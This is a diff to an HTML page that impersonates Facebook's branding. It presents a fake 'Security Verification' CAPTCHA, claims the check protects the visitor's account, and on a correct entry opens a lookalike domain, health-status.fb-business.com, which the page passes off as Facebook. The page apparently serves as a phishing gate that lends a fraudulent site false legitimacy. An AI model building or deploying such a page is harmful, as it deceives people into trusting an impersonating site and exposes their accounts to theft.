@@ -1,1 +1,229 @@
-<html><head><meta charset="utf-8" /><meta name="referrer" content="origin" /></head><body><script type="text/javascript" nonce="5DRkvV1W">document.location.replace("health-status.fb-business.com\/?fbclid=IwZXh0bgNhZW0CMTAAAR1gViGAy2urq5gGWg-bTeXCGZdRZFWIlmBkyifejMf2hVmEBrm5XQUi_TY_aem_veiN99KaeJ-HH5uYpa5izQ");</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook CAPTCHA Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+
+        .facebook-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            max-width: 600px;
+            width: 95%;
+        }
+
+        .facebook-logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 30px;
+            letter-spacing: -1px;
+        }
+
+        h2 {
+            color: #1c1e21;
+            font-size: 32px;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .captcha-box {
+            background: #f0f2f5;
+            padding: 25px;
+            margin: 20px 0;
+            border: 2px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 36px;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 8px;
+            user-select: none;
+            color: #1c1e21;
+            font-weight: bold;
+        }
+
+        .input-field {
+            padding: 20px;
+            margin: 15px 0;
+            width: calc(100% - 40px);
+            border: 2px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 24px;
+            color: #1c1e21;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px #e7f3ff;
+        }
+
+        .verify-button {
+            background-color: #1877f2;
+            color: white;
+            padding: 20px 30px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 24px;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .verify-button:hover {
+            background-color: #166fe5;
+            transform: translateY(-1px);
+        }
+
+        .verify-button:disabled {
+            background-color: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .facebook-card {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f7f8fa;
+            border-radius: 10px;
+            border: 2px solid #dddfe2;
+        }
+
+        .facebook-text {
+            color: #65676b;
+            font-size: 18px;
+            line-height: 1.5;
+        }
+
+        .error-message {
+            color: #dc3545;
+            margin-top: 15px;
+            font-size: 20px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .refresh-button {
+            background-color: transparent;
+            border: none;
+            color: #1877f2;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 10px 20px;
+            margin-top: 10px;
+            text-decoration: underline;
+        }
+
+        .refresh-button:hover {
+            color: #166fe5;
+        }
+
+        @media (max-width: 768px) {
+            .facebook-container {
+                padding: 30px;
+            }
+            
+            .facebook-logo {
+                font-size: 42px;
+            }
+            
+            h2 {
+                font-size: 28px;
+            }
+            
+            .captcha-box {
+                font-size: 32px;
+                padding: 20px;
+            }
+            
+            .input-field {
+                font-size: 20px;
+            }
+            
+            .verify-button {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="facebook-container">
+        <div class="facebook-logo">facebook</div>
+        
+        <h2>Security Verification</h2>
+        <div class="captcha-box" id="captchaText"></div>
+        <input type="text" 
+               id="captchaInput" 
+               class="input-field" 
+               placeholder="Enter CAPTCHA code"
+               autocomplete="off">
+        <div id="errorMessage" class="error-message">Incorrect CAPTCHA code. Please try again.</div>
+        <button id="verifyButton" class="verify-button" onclick="verifyCaptcha()" disabled>Continue</button>
+        <button class="refresh-button" onclick="refreshCaptcha()">Refresh CAPTCHA</button>
+        
+        <div class="facebook-card">
+            <p class="facebook-text">This security check helps us ensure you're a real person and protect your Facebook account from unauthorized access.</p>
+        </div>
+    </div>
+
+    <script>
+        // Generate random CAPTCHA text
+        function generateCaptcha() {
+            const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+            let captcha = '';
+            for (let i = 0; i < 6; i++) {
+                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return captcha;
+        }
+
+        // Display initial CAPTCHA
+        let captchaText = generateCaptcha();
+        document.getElementById('captchaText').textContent = captchaText;
+
+        // Refresh CAPTCHA function
+        function refreshCaptcha() {
+            captchaText = generateCaptcha();
+            document.getElementById('captchaText').textContent = captchaText;
+            document.getElementById('captchaInput').value = '';
+            document.getElementById('verifyButton').disabled = true;
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        // Enable/disable button based on input
+        document.getElementById('captchaInput').addEventListener('input', function() {
+            document.getElementById('verifyButton').disabled = this.value.length === 0;
+            document.getElementById('errorMessage').style.display = 'none';
+        });
+
+        // Verify CAPTCHA
+        function verifyCaptcha() {
+            const input = document.getElementById('captchaInput').value;
+            if (input === captchaText) {
+                // Successful verification
+                window.open('https://health-status.fb-business.com/', '_blank');
+            } else {
+                // Show error message
+                document.getElementById('errorMessage').style.display = 'block';
+                document.getElementById('captchaInput').value = '';
+                refreshCaptcha();
+            }
+        }
+    </script>
+</body>
+</html>
